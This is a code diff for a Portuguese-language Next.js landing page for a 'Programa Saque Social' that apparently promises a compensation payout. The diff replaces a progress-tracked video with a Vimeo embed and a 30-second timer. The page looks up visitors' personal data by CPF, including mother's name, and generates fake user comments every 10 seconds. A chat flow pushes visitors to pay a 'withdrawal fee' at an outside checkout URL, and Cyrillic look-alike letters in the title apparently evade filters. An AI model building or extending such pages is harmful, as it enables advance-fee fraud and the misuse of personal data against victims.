@@ -5,11 +5,9 @@ import React, { useState, useEffect, useRef, Suspense } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
 import { useRouter, useSearchParams } from 'next/navigation';
-import Plyr from 'plyr-react';
-import 'plyr-react/plyr.css';
 import '../offer-page.css'; // Styles specific to this offer page
 import {
-  MoreVertical, Cookie, LayoutGrid, User, Menu, Search, VolumeX, CreditCard, CalendarDays, ThumbsUp, ThumbsDown, X, Loader2
+  MoreVertical, Cookie, LayoutGrid, User, Menu, Search, CreditCard, CalendarDays, ThumbsUp, ThumbsDown, X, Loader2
 } from 'lucide-react';
 
 interface UserData {
@@ -42,9 +40,6 @@ function OfferContent() {
 
   const [loading, setLoading] = useState(true);
   const [showMainContent, setShowMainContent] = useState(false);
-  const [showThumbnailOverlay, setShowThumbnailOverlay] = useState(true);
-  const [showResgateOverlay, setShowResgateOverlay] = useState(false);
-  const [progress, setProgress] = useState(0);
   const [showSaqueButton, setShowSaqueButton] = useState(false);
   
   const [userData, setUserData] = useState<UserData | null>(null);
@@ -59,13 +54,7 @@ function OfferContent() {
   const [chatInputValue, setChatInputValue] = useState('');
   const [chaveEnviada, setChaveEnviada] = useState(false);
 
-  const playerRef = useRef<Plyr | null>(null);
   const chatBodyRef = useRef<HTMLDivElement>(null);
-
-  const [videoStarted, setVideoStarted] = useState(false);
-  const [videoCompleted, setVideoCompleted] = useState(false);
-  const [progressEnabled, setProgressEnabled] = useState(false);
-
 
   // Back button redirect logic
   useEffect(() => {
@@ -86,24 +75,17 @@ function OfferContent() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, []);
   
-  // Restore state from localStorage
+  // Restore state from localStorage (chat related)
   useEffect(() => {
     const storedState = localStorage.getItem('offerPageState');
     if (storedState) {
       try {
         const state = JSON.parse(storedState);
-        if (state.videoStarted) setVideoStarted(state.videoStarted);
-        if (state.videoCompleted) {
-          setVideoCompleted(state.videoCompleted);
-          setShowResgateOverlay(true);
-          setShowSaqueButton(true);
-          setProgress(100);
-        }
-        if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
         if (state.chaveEnviada) setChaveEnviada(state.chaveEnviada);
         if (state.chatMessages) setChatMessages(state.chatMessages);
-        // User data will be fetched, not restored directly to avoid stale data
-        // Comments will be fetched/generated, not restored directly
+        // If saque button was shown due to timeout, reflect that
+        if (state.showSaqueButton) setShowSaqueButton(state.showSaqueButton);
+
       } catch (e) {
         console.error("Failed to parse stored state:", e);
         localStorage.removeItem('offerPageState');
@@ -111,17 +93,15 @@ function OfferContent() {
     }
   }, []);
 
-  // Store state to localStorage
+  // Store state to localStorage (chat related)
   useEffect(() => {
     const stateToStore = {
-      videoStarted,
-      videoCompleted,
-      progressEnabled,
       chaveEnviada,
-      chatMessages: chatMessages.filter(msg => msg.type !== 'typing'), // Don't store typing indicator
+      chatMessages: chatMessages.filter(msg => msg.type !== 'typing'), 
+      showSaqueButton, // Persist if saque button became visible
     };
     localStorage.setItem('offerPageState', JSON.stringify(stateToStore));
-  }, [videoStarted, videoCompleted, progressEnabled, chaveEnviada, chatMessages]);
+  }, [chaveEnviada, chatMessages, showSaqueButton]);
 
 
   const formatCPF = (cpf: string | undefined) => {
@@ -153,9 +133,7 @@ function OfferContent() {
       if (!initialCpf) {
         setLoading(false);
         setShowMainContent(true); 
-        // Optionally redirect or show error if CPF is missing
         console.warn("CPF not found in query params.");
-        // router.replace('/'); 
         return;
       }
       
@@ -173,67 +151,24 @@ function OfferContent() {
         }
       } catch (err) {
         console.error("Error fetching user data:", err);
-        // Fallback or redirect if API fails
-        // For now, just proceed to show content with placeholders
       } finally {
         setLoading(false);
         setShowMainContent(true);
-        if (!videoCompleted) { // Only show thumbnail if video not already completed
-             setShowThumbnailOverlay(true);
-        }
       }
     }
     
     fetchAndSetUserData();
-  }, [initialCpf, router, videoCompleted]);
+  }, [initialCpf]);
 
-  // Plyr event handlers
+  // Simulate video completion to show saque button
   useEffect(() => {
-    const p = playerRef.current?.plyr;
-    if (!p) return;
-
-    const onTimeUpdate = () => {
-      if (!progressEnabled || videoCompleted) return;
-      const { duration, currentTime } = p;
-      if (duration > 0) {
-        const percent = (currentTime / duration) * 100;
-        setProgress(percent);
-        if (percent >= 99.9 && !videoCompleted) { // Ensure finalizeProgress runs once
-          setVideoCompleted(true);
-          setShowResgateOverlay(true);
-          setShowSaqueButton(true);
-          setProgress(100);
-        }
-      }
-    };
-
-    const onPlay = () => {
-      if (!videoStarted && !videoCompleted && progressEnabled) {
-        setVideoStarted(true);
-      } else if (videoCompleted) {
-        p.pause();
-      }
-    };
-    
-    p.on('timeupdate', onTimeUpdate);
-    p.on('play', onPlay);
-
-    return () => {
-      p.off('timeupdate', onTimeUpdate);
-      p.off('play', onPlay);
-    };
-  }, [progressEnabled, videoCompleted, videoStarted]);
-
-
-  const handleThumbnailClick = () => {
-    const p = playerRef.current?.plyr;
-    if (p) {
-      p.muted = false;
-      p.play();
-      setShowThumbnailOverlay(false);
-      setProgressEnabled(true);
+    if (showMainContent && !showSaqueButton) { // Only run if main content is shown and button isn't already visible
+      const timer = setTimeout(() => {
+        setShowSaqueButton(true);
+      }, 30000); // Show after 30 seconds
+      return () => clearTimeout(timer);
     }
-  };
+  }, [showMainContent, showSaqueButton]);
   
   const handleSaqueButtonClick = () => {
     const params = new URLSearchParams(window.location.search);
@@ -243,9 +178,8 @@ function OfferContent() {
       params.set('nascimento', formatDateBR(userData.nascimento));
       params.set('cpf', formatCPF(userData.cpf || initialCpf));
     }
-    // This should open the chat modal instead of redirecting
     setIsChatModalOpen(true);
-    if (chatMessages.length === 0 && !chaveEnviada) { // Start bot flow only if not started
+    if (chatMessages.length === 0 && !chaveEnviada) { 
         startBotFlowInitial();
     }
   };
@@ -287,8 +221,7 @@ function OfferContent() {
     const payButton = document.getElementById('dynamic-pay-button');
     if (payButton) {
       payButton.onclick = () => {
-        // Redirect to payment URL
-        const paymentUrl = "https://kingspay.site/checkout/taxa-de-saque-2025"; // Use the correct URL
+        const paymentUrl = "https://kingspay.site/checkout/taxa-de-saque-2025"; 
         window.location.href = paymentUrl;
       };
     }
@@ -317,7 +250,7 @@ function OfferContent() {
         return data.results[0];
       } catch (error) {
         console.error("Error fetching random user:", error);
-        return { name: { first: "Usuário" }, picture: { medium: "https://placehold.co/40x40.png" } };
+        return { name: { first: "Usuário", last: "Anônimo" }, picture: { medium: "https://placehold.co/40x40.png" } };
       }
     };
 
@@ -331,7 +264,7 @@ function OfferContent() {
         likes: Math.floor(Math.random() * 100),
         dislikes: Math.floor(Math.random() * 20),
       };
-      setComments(prev => [newComment, ...prev.slice(0, 4)]); // Keep last 5 comments
+      setComments(prev => [newComment, ...prev.slice(0, 4)]); 
       setTotalComments(prev => prev + 1);
     };
     
@@ -349,7 +282,7 @@ function OfferContent() {
       createNewComment(messages[Math.floor(Math.random() * messages.length)]);
       setLoadingCommentsText("Comentários atualizados.");
       setTimeout(() => setLoadingCommentsText(""), 2000); 
-    }, 10000); // New comment every 10 seconds
+    }, 10000); 
 
     return () => clearInterval(commentInterval);
   }, []);
@@ -373,14 +306,6 @@ function OfferContent() {
     <>
       <Head>
         <title>Рrоgrаmа Sаquе Sосiаl - Oferta</title>
-        <link rel="preload" href="https://scripts.converteai.net/20448767-cfea-41f4-baa4-9dc0974d8a85/players/67e561a62d07477843fbcb30/player.js" as="script" />
-        <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer/v1/smartplayer.min.js" as="script" />
-        <link rel="preload" href="https://images.converteai.net/20448767-cfea-41f4-baa4-9dc0974d8a85/players/67e561a62d07477843fbcb30/thumbnail.jpg" as="image" />
-        <link rel="preload" href="https://cdn.converteai.net/20448767-cfea-41f4-baa4-9dc0974d8a85/67e561a11dbeeeb6d6448e6e/main.m3u8" as="fetch" />
-        <link rel="dns-prefetch" href="https://cdn.converteai.net" />
-        <link rel="dns-prefetch" href="https://scripts.converteai.net" />
-        <link rel="dns-prefetch" href="https://images.converteai.net" />
-        <link rel="dns-prefetch" href="https://api.vturb.com.br" />
       </Head>
       <div className="offer-page-body">
         <header className="offer-page-header">
@@ -413,42 +338,15 @@ function OfferContent() {
 
         {showMainContent && (
           <main id="main-content">
-            <div className="progress-container">
-              <div className="progress-bar" style={{ width: `${progress}%` }}></div>
-            </div>
-
             <div className="video-container">
-               <Plyr
-                ref={playerRef as any}
-                source={{
-                  type: 'video',
-                  sources: [{ src: '/media/zpjYNr3agaFy.mp4', type: 'video/mp4' }],
-                }}
-                options={{
-                  controls: [],
-                  autoplay: true,
-                  muted: true,
-                  clickToPlay: false,
-                  hideControls: true,
-                }}
-               
-              />
-              {showThumbnailOverlay && (
-                <div className="thumbnail-overlay" onClick={handleThumbnailClick} style={{display: 'flex'}}>
-                  <div className="thumbnail-content">
-                    <h2>Сliquе<br />раrа оuvir</h2>
-                    <VolumeX size={64} />
-                  </div>
-                </div>
-              )}
-              {showResgateOverlay && (
-                <div className="resgate-overlay" style={{display: 'flex'}}>
-                  <div className="resgate-content">
-                    <h2>Sеu sаquе já еstá disроnívеl раrа rеsgаtе!</h2>
-                    <p>Сliquе nо bоtãо аbаiхо раrа еfеtuаr о sаquе.</p>
-                  </div>
-                </div>
-              )}
+               <iframe 
+                src="https://player.vimeo.com/video/1092295712?h=47c944f726&title=0&byline=0&portrait=0&badge=0&autopause=0&player_id=0&app_id=58479" 
+                width="1280" 
+                height="720" 
+                allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media" 
+                title="Video Page"
+                loading="lazy"
+               ></iframe>
             </div>
 
             <div className="info-container">
@@ -465,7 +363,7 @@ function OfferContent() {
                 <User /> <span id="mother-value">{formatFullName(userData?.mae) || 'Não Informado'}</span>
               </div>
               <div className="info-item" id="status-item">
-                <Search /> <span>{videoCompleted ? "Saque liberado." : "Sua indenização está sendo calculada..."}</span>
+                <Search /> <span>{showSaqueButton ? "Saque liberado." : "Sua indenização está sendo calculada..."}</span>
               </div>
             </div>
 
